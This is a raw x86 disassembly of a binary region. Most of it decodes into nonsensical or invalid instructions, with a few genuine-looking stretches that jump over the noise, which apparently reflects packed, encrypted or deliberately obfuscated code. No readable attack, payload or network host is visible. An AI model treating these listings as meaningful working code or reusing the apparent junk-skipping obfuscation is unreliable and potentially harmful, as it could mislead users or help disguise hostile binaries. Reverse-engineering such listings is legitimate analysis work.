  402fec:	test   DWORD PTR [edx],edi
  402fee:	fwait
  402fef:	jecxz  0x40303f
  402ff1:	push   ds
  402ff2:	out    0x23,al
  402ff4:	inc    bh
  402ff6:	loope  0x403015
  402ff8:	in     al,dx
  402ff9:	inc    esp
  402ffa:	mov    ah,bl
  402ffc:	xchg   edi,eax
  402ffd:	sub    ah,BYTE PTR [ebp-0x2e]
  403000:	adc    BYTE PTR [esi],bl
  403002:	sbb    DWORD PTR [ebx+0x4133cbc8],edx
  403008:	test   DWORD PTR [ebp-0x3b],eax
  40300b:	ror    DWORD PTR [eax],0x9e
  40300e:	test   BYTE PTR [eax],dl
  403010:	pop    ebx
  403011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403012:	in     eax,dx
  403013:	pusha  
  403014:	icebp  
  403015:	and    ecx,DWORD PTR [esi+ebx*1+0x43]
  403019:	(bad)  
  40301a:	dec    edi
  40301b:	dec    esp
  40301c:	retf   
  40301d:	arpl   sp,bp
  40301f:	push   0xfc3e43fa
  403024:	outs   dx,BYTE PTR ds:[esi]
  403025:	mov    WORD PTR [eax-0x1d],?
  403028:	pop    ebp
  403029:	mov    eax,ds:0xbbd75f49
  40302e:	loop   0x403022
  403030:	aam    0x7a
  403032:	jno    0x403013
  403034:	or     al,0x22
  403036:	dec    ecx
  403037:	stos   BYTE PTR es:[edi],al
  403038:	test   DWORD PTR [ecx+0x1d],ebp
  40303b:	dec    ebx
  40303c:	xchg   BYTE PTR [eax+0x8],dl
  40303f:	sbb    BYTE PTR [edx],dl
  403041:	stos   BYTE PTR es:[edi],al
  403042:	xor    al,0x11
  403044:	mov    esp,0xa601f091
  403049:	sub    bh,ah
  40304b:	sahf   
  40304c:	push   edx
  40304d:	add    DWORD PTR [esi+0x35],edx
  403050:	popf   
  403051:	mov    ch,0xf9
  403053:	js     0x403090
  403055:	add    BYTE PTR [edx+edi*1+0x32],0x39
  40305a:	cmp    eax,0x8e35cb39
  40305f:	outs   dx,BYTE PTR ds:[esi]
  403060:	or     dl,ch
  403062:	and    dh,BYTE PTR [ecx+0x59c306e1]
  403068:	test   bh,dh
  40306a:	das    
  40306b:	fucomip st,st(2)
  40306d:	ds jg  0x40305b
  403070:	enter  0x138e,0xa8
  403074:	jecxz  0x403036
  403076:	call   FWORD PTR [ebx+0x6a34906b]
  40307c:	dec    ecx
  40307d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40307e:	push   esp
  40307f:	pop    ebx
  403080:	test   dl,0xd4
  403083:	sbb    BYTE PTR [esi],0x2c
  403086:	icebp  
  403087:	lds    edi,FWORD PTR [ebx]
  403089:	into   
  40308a:	stos   BYTE PTR es:[edi],al
  40308b:	mov    bl,0x9
  40308d:	xchg   ecx,eax
  40308e:	push   ebx
  40308f:	pop    esi
  403090:	in     eax,0x44
  403092:	push   ecx
  403093:	mov    eax,0xc3f86a6a
  403098:	pop    esp
  403099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40309a:	or     BYTE PTR [eax-0x1d],ah
  40309d:	cmp    dh,BYTE PTR [esi]
  40309f:	fs pop esp
  4030a1:	ins    BYTE PTR es:[edi],dx
  4030a2:	les    esp,FWORD PTR [ebp+0x30]
  4030a5:	fcomp  DWORD PTR [ecx+ebx*8-0xf]
  4030a9:	mov    dh,BYTE PTR [edx+0x7c]
  4030ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030ad:	daa    
  4030ae:	push   esp
  4030af:	sti    
  4030b0:	cs xchg esp,eax
  4030b2:	pop    edi
  4030b3:	pop    es
  4030b4:	or     edx,DWORD PTR [edi+ebp*8]
  4030b7:	into   
  4030b8:	xchg   BYTE PTR [eax+0x744bae42],bl
  4030be:	jp     0x403042
  4030c0:	shl    bl,cl
  4030c2:	es cdq 
  4030c4:	fnsave [eax]
  4030c6:	jnp    0x4030d5
  4030c8:	ja     0x40308a
  4030ca:	pop    edi
  4030cb:	xchg   ebp,eax
  4030cc:	add    ah,BYTE PTR [eax]
  4030ce:	fs mov esi,0x5dd8916b
  4030d4:	shr    DWORD PTR [ebp-0x41],cl
  4030d7:	scas   eax,DWORD PTR es:[edi]
  4030d8:	retf   0xc330
  4030db:	and    bh,BYTE PTR [ebp-0x260e484b]
  4030e1:	cmp    BYTE PTR [eax],bh
  4030e3:	jnp    0x4030c2
  4030e5:	jp     0x40312c
  4030e7:	push   eax
  4030e8:	push   eax
  4030e9:	adc    DWORD PTR [ebx],esp
  4030eb:	pop    ss
  4030ec:	out    0xb2,eax
  4030ee:	leave  
  4030ef:	sar    DWORD PTR [ecx-0x2b31b1ee],0xf4
  4030f6:	add    al,BYTE PTR [edx]
  4030f8:	mov    DWORD PTR [eax],0x635e5a82
  4030fe:	aas    
  4030ff:	jl     0x40316b
  403101:	mov    DWORD PTR [edi],eax
  403103:	ret    
  403104:	sub    al,0xe2
  403106:	add    edi,DWORD PTR [edx+ebx*4+0x2e1baad4]
  40310d:	cmp    eax,0x16e77567
  403112:	jns    0x40316a
  403114:	inc    edx
  403115:	adc    bl,BYTE PTR [ebx+ecx*4+0x3cb004f2]
  40311c:	push   0x1750e2a9
  403121:	fsub   DWORD PTR [ebx]
  403123:	ja     0x40316e
  403125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403126:	(bad)  
  403127:	test   eax,0x74f07b53
  40312c:	in     al,0xa3
  40312e:	not    DWORD PTR [eax-0x63d7fd32]
  403134:	or     al,0x7
  403136:	mov    eax,0x78b3a307
  40313b:	mov    DWORD PTR [ecx],eax
  40313d:	mov    eax,DWORD PTR [ebp-0x24]
  403140:	mov    ecx,DWORD PTR [ebp-0x8]
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x64
  40316d:	jnp    0x403110
  40316f:	mov    esp,0x7e7e1589
  403174:	outs   dx,DWORD PTR ds:[esi]
  403175:	jge    0x4031f5
  403177:	jle    0x40312b
  403179:	add    DWORD PTR [ecx+0x11],eax
  40317c:	sub    BYTE PTR [edx],al
  40317e:	mov    esp,0x9c277d6c
  403183:	cs sbb bl,dl
  403186:	jno    0x403116
  403188:	sub    al,0xa4
  40318a:	jne    0x403149
  40318c:	repnz call 0x70bf:0x2bd2e63
  403194:	xlat   BYTE PTR ds:[ebx]
  403195:	pop    ecx
  403196:	adc    eax,0xe8509889
  40319b:	(bad)  
  40319c:	imul   BYTE PTR [esi-0x7b]
  40319f:	add    cl,BYTE PTR ds:0xd2be8d7e
  4031a5:	pop    esi
  4031a6:	xchg   esi,eax
  4031a7:	add    BYTE PTR ds:0xc6a0bf9f,ah
  4031ad:	std    
  4031ae:	loope  0x4031af
  4031b0:	(bad)  
  4031b1:	mov    ds:0x8ccda669,eax
  4031b6:	mov    al,0x47
  4031b8:	mov    eax,ds:0x49e15dd6
  4031bd:	sub    DWORD PTR [esi+0x75eacecb],ebp
  4031c3:	sub    ecx,DWORD PTR cs:[edx+0x46533b5d]
  4031ca:	push   esi
  4031cb:	(bad)  
  4031cc:	inc    ebp
  4031cd:	outs   dx,DWORD PTR ds:[esi]
  4031ce:	and    eax,0xe3f92bd4
  4031d3:	sti    
  4031d4:	adc    cl,BYTE PTR [ecx-0x24]
  4031d7:	test   BYTE PTR [ebx],0x3b
  4031da:	call   0x2718becb
  4031df:	pusha  
  4031e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031e1:	xchg   esp,eax
  4031e2:	dec    esi
  4031e3:	int3   
  4031e4:	inc    ebx
  4031e5:	mov    dh,0xf9
  4031e7:	mov    ebx,0x3058443c
  4031ec:	xchg   edx,eax
  4031ed:	jno    0x403196
  4031ef:	test   DWORD PTR [edi],ecx
  4031f1:	inc    esp
  4031f2:	or     cl,bh
  4031f4:	pusha  
  4031f5:	pop    edx
  4031f6:	aam    0x1b
  4031f8:	inc    eax
  4031f9:	mov    dl,dh
  4031fb:	bnd jp 0x4031ee
  4031fe:	pusha  
  4031ff:	or     eax,0x3f2726bd
  403204:	or     bl,ch
  403206:	dec    ebx
  403207:	push   cs
  403208:	test   ebp,eax
  40320a:	xlat   BYTE PTR ds:[ebx]
  40320b:	mov    al,ds:0x533a7627
  403210:	nop
  403211:	jns    0x40328a
  403213:	pop    eax
  403214:	push   0xffffffce
  403216:	(bad)  
  403217:	pop    edx
  403218:	sub    DWORD PTR [eax-0xe],0x72
  40321c:	or     eax,0xbfe5609a
  403221:	push   ds
  403222:	call   0xb28c:0xcaf000ea
  403229:	push   ebp
  40322a:	adc    eax,0x17109025
  40322f:	sar    BYTE PTR [edi+edi*1-0x7d],1
  403233:	bnd jns 0x4032a6
  403236:	mov    dl,0x1
  403238:	rcr    DWORD PTR [eax-0x1accb303],0x4f
  40323f:	call   DWORD PTR ds:0xde007f33
  403245:	fsubr  DWORD PTR [ebx+0x19ec8c84]
  40324b:	jl     0x403292
  40324d:	lods   al,BYTE PTR ds:[esi]
  40324e:	fwait
  40324f:	push   ds
  403250:	dec    esp
  403251:	jnp    0x40322d
  403253:	jl     0x40323d
  403255:	mov    ebp,0x69115e22
  40325a:	mov    ebx,0x6e83e253
  40325f:	xor    eax,0xe95ae051
  403264:	call   0x435:0x18d0c96e
  40326b:	cmp    edx,esi
  40326d:	in     eax,dx
  40326e:	add    esi,DWORD PTR [eax-0x32]
  403271:	xchg   esi,eax
  403272:	ds (bad) 
  403274:	dec    edi
  403275:	loope  0x4032cc
  403277:	pop    ecx
  403278:	lods   al,BYTE PTR ds:[esi]
  403279:	mov    bl,0xd5
  40327b:	mov    ecx,0xf5fb1831
  403280:	inc    ebx
  403281:	or     dl,bh
  403283:	mov    ds:0xccff27f4,al
  403288:	or     BYTE PTR [edi],ah
  40328a:	mov    edi,ebp
  40328c:	popa   
  40328d:	xor    al,0x65
  40328f:	pop    edi
  403290:	mov    ss,WORD PTR [eax-0x41c446cb]
  403296:	add    al,0x26
  403298:	jl     0x4032c1
  40329a:	int3   
  40329b:	and    ah,dl
  40329d:	xadd   DWORD PTR [eax],ecx
  4032a0:	jmp    0x4032eb
  4032a2:	loopne 0x403246
  4032a4:	mov    esp,eax
  4032a6:	xor    esp,DWORD PTR [edi]
  4032a8:	jmp    0x403239
  4032aa:	add    BYTE PTR [ebp+0x20679b7d],dl
  4032b0:	or     BYTE PTR [ebx-0x70],cl
  4032b3:	lds    esi,FWORD PTR [edx+0x610e0c49]
  4032b9:	and    BYTE PTR [edx],ch
  4032bb:	fistp  DWORD PTR [edi]
  4032bd:	mov    BYTE PTR [esi+0x5951823a],al
  4032c3:	out    0x39,eax
  4032c5:	ss mov DWORD PTR fs:[edx-0x36cad520],edx
  4032cd:	inc    eax
  4032ce:	ins    DWORD PTR es:[edi],dx
  4032cf:	icebp  
  4032d0:	mov    ebx,0xd2c33398
  4032d5:	inc    ecx
  4032d6:	ret    0x381
  4032d9:	and    DWORD PTR [eax+0x52be9275],esp
  4032df:	inc    eax
  4032e0:	xor    edi,DWORD PTR [eax+0x74da841]
  4032e6:	xchg   edx,eax
  4032e7:	fsubr  DWORD PTR [edi+0x5231eb7e]
  4032ed:	sbb    eax,0x9e9f8773
  4032f3:	inc    edx
  4032f4:	dec    eax
  4032f5:	scas   al,BYTE PTR es:[edi]
  4032f6:	and    BYTE PTR [ecx-0x70247dfd],cl
  4032fc:	mov    edi,0x994fe489
  403301:	mov    ecx,?
  403303:	leave  
  403304:	inc    edx
  403305:	fisttp DWORD PTR [esi]
  403307:	xor    eax,0xba9e2a34
  40330c:	arpl   bx,dx
  40330e:	aad    0x16
  403310:	clc    
  403311:	fisttp QWORD PTR [edx-0x672754cb]
  403317:	lea    edi,[ecx-0x9bb88ca]
  40331d:	push   eax
  40331e:	(bad)  
  40331f:	ror    BYTE PTR [edx],0xb7
  403322:	xor    eax,0x2d91ca37
  403327:	sbb    eax,0x88342e82
  40332c:	push   esi
  40332d:	(bad)  
  40332e:	iret   
  40332f:	nop
  403330:	jno    0x4032b5
  403332:	xchg   edi,eax
  403333:	ss fcomi st,st(6)
  403336:	add    eax,0x46abcf98
  40333b:	test   eax,0xad74a876
  403340:	mov    bh,0xef
  403342:	popf   
  403343:	repnz or eax,0xf6bbca13
  403349:	push   es
  40334a:	(bad)  
  40334c:	fiadd  DWORD PTR [edi-0x5661da25]
  403352:	xchg   ebx,eax
  403353:	pop    ebx
  403354:	stc    
  403355:	and    eax,0x4bc1aaf4
  40335a:	test   BYTE PTR [ebp+0x5c],dh
  40335d:	das    
  40335e:	leave  
  40335f:	mov    al,0xe4
  403361:	ret    
  403362:	iret   
  403363:	jge    0x403348
  403365:	pop    edi
  403366:	jbe    0x403318
  403368:	ret    0x7b81
  40336b:	nop
  40336c:	pushf  
  40336d:	sahf   
  40336e:	mov    ah,0xc2
  403370:	lods   eax,DWORD PTR ds:[esi]
  403371:	cdq    
  403372:	pop    esp
  403373:	sar    DWORD PTR [edx+0x3b32660],0x43
  40337a:	sar    BYTE PTR [ebp+0x78],1
  40337d:	add    al,0x3c
  40337f:	sub    esp,edx
  403381:	lock add eax,0x6f73782c
  403387:	sbb    esp,DWORD PTR [esi+0xe2e2678]
  40338d:	lods   eax,DWORD PTR ds:[esi]
  40338e:	mov    bl,0x5f
  403390:	cmp    eax,0x65b3df46
  403395:	or     esp,DWORD PTR [edi+0x7ff8e3c0]
  40339b:	dec    esp
  40339c:	leave  
  40339d:	cmp    edx,0xe8e39e5f
  4033a3:	sbb    BYTE PTR [esi],dh
  4033a5:	jnp    0x40336a
  4033a7:	adc    BYTE PTR [eax-0x3d900d5b],dl
  4033ad:	mov    al,ds:0xc7934d07
  4033b2:	lock dec edi
  4033b4:	push   0x9f5c8965
  4033b9:	ffree  st(6)
  4033bb:	sub    al,0x1d
  4033bd:	add    DWORD PTR [ebp+ebx*2-0x1df9b295],esi
  4033c4:	mov    ah,0x95
  4033c6:	dec    edi
  4033c7:	ror    dh,cl
  4033c9:	loope  0x4033c8
  4033cb:	loop   0x403419
  4033cd:	sti    
  4033ce:	jge    0x403440
  4033d0:	jp     0x403445
  4033d2:	adc    al,dl
  4033d4:	and    DWORD PTR [ebp-0x71],edx
  4033d7:	aaa    
  4033d8:	pop    eax
  4033d9:	pop    ds
  4033da:	adc    DWORD PTR [edi-0x6a],ecx
  4033dd:	(bad)  
  4033de:	jno    0x40341f
  4033e0:	xchg   esp,eax
  4033e1:	imul   eax,DWORD PTR [ebp+0x559be477],0x28d3dd3e
  4033eb:	adc    ecx,ebp
  4033ed:	(bad)  
  4033ee:	mov    al,ds:0x6cac7cce
  4033f3:	add    ch,BYTE PTR [esi]
  4033f5:	inc    ecx
  4033f6:	je     0x40339c
  4033f8:	nop
  4033f9:	loop   0x4033fb
  4033fb:	test   al,0xe3
  4033fd:	loopne 0x4033b5
  4033ff:	(bad)  
  403400:	test   al,0x63
  403403:	ficomp WORD PTR cs:[ebx+0x5e]
  403407:	xor    DWORD PTR [edx+eax*4+0x5e],ebx
  40340b:	jbe    0x403475
  40340d:	pop    esi
  40340e:	mov    bh,0x75
  403410:	jbe    0x4033a1
  403412:	push   0xffffff81
  403414:	in     eax,0x9a
  403416:	loopne 0x4033e3
  403418:	div    ecx
  40341a:	add    edx,ebp
  40341c:	adc    BYTE PTR ds:0x961b0f8f,bl
  403422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403423:	push   ebp
  403424:	mov    dl,0x7f
  403426:	clc    
  403427:	mov    ds:0x4cc21f40,eax
  40342c:	jecxz  0x403486
  40342e:	clc    
  40342f:	icebp  
  403430:	rcl    BYTE PTR [edx+edi*4+0x5d],cl
  403434:	mov    bl,0xf2
  403436:	push   ebx
  403437:	xchg   ecx,eax
  403438:	jmp    0xd3f0fffa
  40343d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40343e:	xor    eax,0x2ac81525
  403443:	inc    ebp
  403444:	outs   dx,BYTE PTR ds:[esi]
  403445:	cli    
  403446:	xor    eax,0x510798d3
  40344b:	xchg   esp,eax
  40344c:	jmp    0x532f:0x6b489b6a
  403453:	sub    bh,BYTE PTR [esi+0xe]
  403456:	push   edi
  403457:	xor    DWORD PTR [edx+0x27d85ce0],esp
  40345d:	cmp    DWORD PTR [edx+0x33],0x2f
  403461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403462:	mov    bh,0xcf
  403464:	mov    ch,0x7d
  403466:	sub    BYTE PTR [edx-0x29f10837],bh
  40346c:	pop    edx
  40346d:	fstp   QWORD PTR [ebp+0x36d41f2f]
  403473:	or     al,BYTE PTR [edi-0x8b8a7f2]
  403479:	shl    DWORD PTR [ebx+0x46a05750],0xea
  403480:	adc    DWORD PTR [esi],esi
  403482:	add    ebp,DWORD PTR [esi+0x11]
  403485:	cwde   
  403486:	or     eax,0x366bd95e
  40348b:	pusha  
  40348c:	in     eax,dx
  40348d:	leave  
  40348e:	inc    eax
  40348f:	mov    ecx,0xf47218fc
  403494:	lea    ecx,[ecx+0x71]
  403497:	int    0xfb
  403499:	loop   0x40345f
  40349b:	xlat   BYTE PTR ds:[ebx]
  40349c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40349d:	(bad)  
  40349e:	cld    
  40349f:	shl    ch,1
  4034a1:	push   cs
  4034a2:	test   DWORD PTR [esi],edi
  4034a4:	and    eax,0x445c982
  4034a9:	jle    0x403446
  4034ab:	sahf   
  4034ac:	mov    ds:0x1c4a5fe8,al
  4034b1:	jae    0x40349c
  4034b3:	mov    bh,0x39
  4034b5:	dec    DWORD PTR [edx-0x4eabc46f]
  4034bb:	dec    ebp
  4034bc:	std    
  4034bd:	add    eax,ebp
  4034bf:	xchg   DWORD PTR [ebp+0x18],edx
  4034c2:	dec    ebp
  4034c3:	retf   0x562f
  4034c6:	ins    BYTE PTR es:[edi],dx
  4034c7:	add    al,0xfd
  4034c9:	and    DWORD PTR [edi+0x517c25b9],ebp
  4034cf:	cmc    
  4034d0:	pop    ebp
  4034d1:	repnz out dx,al
  4034d3:	test   DWORD PTR [edx+eiz*1-0x4a803059],ebx
  4034da:	dec    eax
  4034db:	dec    ebp
  4034dc:	pop    eax
  4034dd:	out    dx,eax
  4034de:	mov    cl,0x5d
  4034e0:	mov    dl,0x4d
  4034e2:	adc    cl,BYTE PTR [esi+0x7e]
  4034e5:	pop    ds
  4034e6:	mov    WORD PTR ds:0x8cf449d4,ds
  4034ec:	mov    al,ds:0x88301722
  4034f1:	dec    BYTE PTR [esi-0x19]
  4034f4:	inc    ecx
  4034f5:	inc    edi
  4034f6:	or     al,0x1f
  4034f8:	cli    
  4034f9:	test   eax,0xf10f38d
  4034fe:	push   cs
  4034ff:	shr    DWORD PTR [edi+edi*8],cl
  403502:	sub    edi,DWORD PTR [edx-0x589b9958]
  403508:	iret   
  403509:	sbb    dh,BYTE PTR [esp+ebp*4]
  40350c:	adc    al,0x89
  40350e:	jmp    0x4034a1
  403510:	add    dh,al
  403512:	xor    DWORD PTR [edi+0xd],ebp
  403515:	sti    
  403516:	jmp    DWORD PTR [ebp-0xd]
  403519:	stc    
  40351a:	rol    DWORD PTR [eax],1
  40351c:	(bad)  
  40351d:	adc    ah,BYTE PTR [ebx-0x5eec9557]
  403523:	ror    BYTE PTR [ecx],cl
  403525:	cli    
  403526:	aam    0x3e
  403528:	in     al,dx
  403529:	push   ecx
  40352a:	or     eax,0xf975c47e
  40352f:	nop
  403530:	fwait
  403531:	add    DWORD PTR ds:0xbf011c65,eax
  403537:	popa   
  403538:	cmp    WORD PTR [ebx],cx
  40353b:	out    0x53,eax
  40353d:	imul   ecx,edi,0x784fb2b3
  403543:	mov    dh,0xa5
  403545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403546:	stc    
  403547:	push   0xffffffe4
  403549:	push   edx
  40354a:	sbb    ecx,DWORD PTR [ebx+eiz*8]
  40354d:	add    cl,ch
  40354f:	pop    esp
  403550:	in     al,0x79
  403552:	or     eax,0x93d49b61
  403557:	jae    0x4034f5
  403559:	cli    
  40355a:	les    ebp,FWORD PTR [esp+ebp*4+0x42]
  40355e:	enter  0x6940,0xd8
  403562:	pushf  
  403563:	mov    al,ds:0x7d4c8fbb
  403568:	popf   
  403569:	mov    ecx,DWORD PTR [ebp-0x8]
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	sub    esp,esp
  403599:	fbstp  TBYTE PTR [ebp+0x7e7e1186]
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x403617
  4035a4:	xor    BYTE PTR [ebp+0x6307b3b1],cl
  4035aa:	pop    ebp
  4035ab:	ficomp WORD PTR [ecx]
  4035ad:	loop   0x40354a
  4035af:	out    dx,eax
  4035b0:	fiadd  DWORD PTR [ebx-0x16]
  4035b3:	mov    ds:0x146e0125,al
  4035b8:	pop    esi
  4035b9:	pop    ds
  4035ba:	pop    ss
  4035bb:	int    0xdc
  4035bd:	pushf  
  4035be:	xchg   DWORD PTR ds:0x24805caa,ebx
  4035c4:	call   DWORD PTR [edi+0x5867675d]
  4035ca:	aam    0xdf
  4035cc:	test   DWORD PTR [ebp+0x50],eax
  4035cf:	mov    edx,0x705fe013
  4035d4:	mov    edx,0x8bae3dfc
  4035d9:	mov    al,0xc0
  4035db:	test   dl,bh
  4035dd:	or     dh,BYTE PTR [ecx+0x5afbba56]
  4035e3:	cs pop eax
  4035e5:	sti    
  4035e6:	sbb    BYTE PTR [ecx+0x1f92462f],bl
  4035ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ed:	inc    ecx
  4035ee:	aaa    
  4035ef:	xor    ecx,DWORD PTR [eax]
  4035f1:	scas   al,BYTE PTR es:[edi]
  4035f2:	pop    ss
  4035f3:	ss or  ebx,edx
  4035f6:	stc    
  4035f7:	xchg   edx,eax
  4035f8:	sbb    dl,BYTE PTR [edi+0x1adaa751]
  4035fe:	aaa    
  4035ff:	aaa    
  403600:	in     eax,dx
  403601:	mov    BYTE PTR [edi+0x12],bl
  403604:	mov    ecx,0xedd9aaf7
  403609:	inc    eax
  40360a:	adc    DWORD PTR [ebx],0xffffff8e
  40360d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40360e:	pop    es
  40360f:	pop    edx
  403610:	push   cs
  403611:	dec    ebx
  403612:	pop    eax
  403613:	cmp    BYTE PTR [edx],bh
  403615:	sbb    al,0xd4
  403617:	add    dh,BYTE PTR [eax+0x3]
  40361a:	xchg   esi,eax
  40361b:	cdq    
  40361c:	cdq    
  40361d:	jne    0x4035fc
  40361f:	repz lock mov ds:0x9e085cfa,al
  403626:	mov    DWORD PTR [eax],esp
  403628:	sar    DWORD PTR [edx+0x2ad0aed8],1
  40362e:	dec    ebx
  40362f:	pop    es
  403630:	jp     0x4035fd
  403632:	push   es
  403633:	popa   
  403634:	out    dx,al
  403635:	(bad)  
  403636:	xor    BYTE PTR [eax+0x66],dh
  403639:	mov    ds:0x9e49f5a8,al
  40363e:	xor    eax,0xdcf2ff75
  403643:	test   al,0x79
  403645:	aam    0x35
  403647:	pop    edi
  403648:	idiv   DWORD PTR [ecx]
  40364a:	adc    DWORD PTR [ebx],edx
  40364c:	sbb    eax,0xa85e88c0
  403651:	imul   edx,ebx,0x566ec3c8
  403657:	jl     0x40364f
  403659:	or     al,0x17
  40365b:	retf   0x7cd7
  40365e:	xor    DWORD PTR [edi-0x20],edx
  403661:	mov    ds:0xb12b276c,al
  403666:	mov    bh,0xff
  403668:	lea    edx,[esp+eiz*8+0x2e]
  40366c:	push   esi
  40366d:	pop    edx
  40366e:	push   0xecc3136b
  403673:	mov    BYTE PTR [edx-0x31bebc82],ch
  403679:	xchg   edx,eax
  40367a:	dec    ecx
  40367b:	or     edi,esi
  40367d:	xor    dh,al
  40367f:	jno    0x40366b
  403681:	push   edx
  403682:	mov    BYTE PTR [eax+0x2e8fcc6d],al
  403688:	icebp  
  403689:	dec    ecx
  40368a:	or     bl,dl
  40368c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40368e:	inc    esp
  40368f:	mov    edx,0xd5d3f4eb
  403694:	outs   dx,DWORD PTR ds:[esi]
  403695:	lods   al,BYTE PTR ds:[esi]
  403696:	mov    eax,ds:0x1d49a1ae
  40369b:	cwde   
  40369c:	mov    bl,0xd6
  40369e:	mov    ebx,0x60c12608
  4036a3:	les    ebx,FWORD PTR [ebp-0x6d]
  4036a6:	jb     0x403645
  4036a8:	ja     0x4036b0
  4036aa:	pop    edi
  4036ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036ac:	(bad)  
  4036ad:	arpl   sp,dx
  4036af:	pop    es
  4036b0:	sbb    al,0xb9
  4036b2:	xchg   ebp,eax
  4036b3:	push   edi
  4036b4:	cmc    
  4036b5:	inc    esi
  4036b6:	sub    eax,0xfffffff9
  4036b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036ba:	mov    ds:0x55602171,eax
  4036bf:	dec    esp
  4036c0:	cmp    bh,BYTE PTR [bp+0x3bca]
  4036c5:	cmp    BYTE PTR [ebx],bl
  4036c7:	fdiv   st,st(1)
  4036c9:	jp     0x403697
  4036cb:	stos   BYTE PTR es:[edi],al
  4036cc:	(bad)  [ebx+0x351b528]
  4036d2:	mov    WORD PTR [edx-0x54],gs
  4036d5:	inc    eax
  4036d6:	xlat   BYTE PTR ds:[ebx]
  4036d7:	nop
  4036d8:	pop    ebx
  4036d9:	adc    al,BYTE PTR [edi+0x30]
  4036dc:	cmp    BYTE PTR [ebx+0x16],bh
  4036df:	sar    BYTE PTR [esi],1
  4036e1:	adc    BYTE PTR [ebx-0x5b],ch
  4036e4:	lods   eax,DWORD PTR ds:[esi]
  4036e5:	(bad)  
  4036e6:	jle    0x403694
  4036e8:	dec    esp
  4036e9:	sar    DWORD PTR [esp+esi*4+0x60],0x42
  4036ee:	retf   0x4c63
  4036f1:	outs   dx,DWORD PTR ds:[esi]
  4036f2:	ja     0x4036d8
  4036f4:	xchg   BYTE PTR [edi],bl
  4036f6:	xlat   BYTE PTR ds:[ebx]
  4036f7:	sar    eax,cl
  4036f9:	fucomip st,st(5)
  4036fb:	jbe    0x403759
  4036fd:	push   eax
  4036fe:	xchg   edx,eax
  4036ff:	ins    BYTE PTR es:[edi],dx
  403700:	push   cs
  403701:	mov    eax,0x99d2e2f
  403706:	xchg   ebp,eax
  403707:	shl    DWORD PTR [ebx+0x60],1
  40370a:	lock ss mov eax,0xbb5933c0
  403711:	pop    ds
  403712:	sbb    ecx,esp
  403714:	xor    eax,0x3d818cea
  403719:	and    edx,DWORD PTR [edi-0x197e3fd9]
  40371f:	cmp    al,0x4b
  403721:	dec    edi
  403722:	ffreep st(7)
  403724:	fisttp DWORD PTR [ebx]
  403726:	cmp    al,BYTE PTR [ecx+0x3f66ecad]
  40372c:	int3   
  40372d:	and    BYTE PTR [ebx+0x78],cl
  403730:	inc    edi
  403731:	xor    BYTE PTR [ebp-0x2f79a37a],bl
  403737:	dec    ebx
  403738:	push   esi
  403739:	aaa    
  40373a:	mov    edi,0xaa8f0961
  40373f:	test   eax,0xcf0d1b18
  403744:	push   0xf2345eab
  403749:	mov    edi,0x7e8c8216
  40374e:	lea    edx,[ecx]
  403750:	cmc    
  403751:	(bad)  
  403752:	cdq    
  403753:	sub    cl,0x3d
  403756:	mov    DWORD PTR [esi-0xd6ca537],ecx
  40375c:	mov    ds:0x4e612d07,eax
  403761:	cli    
  403762:	and    al,BYTE PTR [esi-0x6f]
  403765:	dec    edi
  403766:	mov    ebx,ss
  403768:	mov    ds:0x7d7d2390,eax
  40376d:	pop    esp
  40376e:	sbb    BYTE PTR [ebx-0x18879a26],0x3a
  403775:	xchg   ecx,eax
  403776:	(bad)  
  403777:	es pop ecx
  403779:	fisttp WORD PTR [ecx+0x6e]
  40377c:	pop    ebx
  40377d:	test   bl,cl
  40377f:	mul    DWORD PTR [eax+0x20239b8c]
  403785:	repz adc eax,0xab1ad3cf
  40378b:	cmp    al,0x8c
  40378d:	adc    dl,BYTE PTR [ebx+edx*2-0x41cc69e]
  403794:	sub    eax,0x1b38cefe
  403799:	jne    0x403747
  40379b:	xchg   edi,eax
  40379c:	js     0x4037bf
  40379e:	dec    edx
  40379f:	sub    BYTE PTR [eax+0x7d],al
  4037a2:	cdq    
  4037a3:	iret   
  4037a4:	leave  
  4037a5:	mov    ebx,0x17fb31fe
  4037aa:	ffree  st(1)
  4037ac:	es jns 0x403730
  4037af:	call   DWORD PTR [esi+0x60]
  4037b2:	push   0xffffffa1
  4037b4:	sub    eax,0xee6cbb6a
  4037b9:	loopne 0x403757
